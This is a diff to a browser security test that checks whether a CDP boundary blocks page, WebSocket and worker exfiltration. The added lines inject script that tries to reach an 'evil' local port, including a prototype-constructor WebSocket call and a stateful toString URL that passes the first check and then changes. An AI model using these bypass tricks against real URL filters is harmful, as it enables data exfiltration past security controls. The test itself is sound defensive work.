@@ -34,6 +34,12 @@ test("CDP boundary blocks page, WebSocket, and worker exfiltration in a real bro
       <script>
         fetch("http://localhost:${evilPort}/fetch").catch(() => {});
         try { new WebSocket("ws://localhost:${evilPort}/socket"); } catch {}
+        try { new WebSocket.prototype.constructor("ws://localhost:${evilPort}/proto"); } catch {}
+        try {
+          let calls = 0;
+          const stateful = { toString() { calls++; return calls === 1 ? "ws://127.0.0.1/ok" : "ws://localhost:${evilPort}/stateful"; } };
+          new WebSocket(stateful);
+        } catch {}
         try {
           const worker = new Worker(URL.createObjectURL(new Blob([
             "fetch('http://localhost:${evilPort}/worker').catch(()=>{})",
